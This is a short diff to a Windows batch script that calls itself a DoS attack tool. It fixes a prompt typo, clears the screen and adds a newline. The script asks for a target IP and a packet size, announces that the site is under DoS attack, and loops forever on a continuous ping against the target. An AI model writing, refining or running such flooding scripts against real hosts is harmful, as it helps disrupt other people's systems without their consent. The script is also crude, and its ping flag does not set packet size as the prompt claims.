@@ -20,9 +20,10 @@ goto Next
 echo.
 set /p m=Target IP: 
 echo.
-set /p n=Paccket Size:
+set /p n=Packet Size:
 echo.
 color 0c
+cls
 echo ===================================
 echo   Attacking started in background
 echo     Site is under Dos Attacking
@@ -33,3 +34,4 @@ echo.
 :DDOS
 ping %m% -i %n% -t >nul
 goto DDOS
+
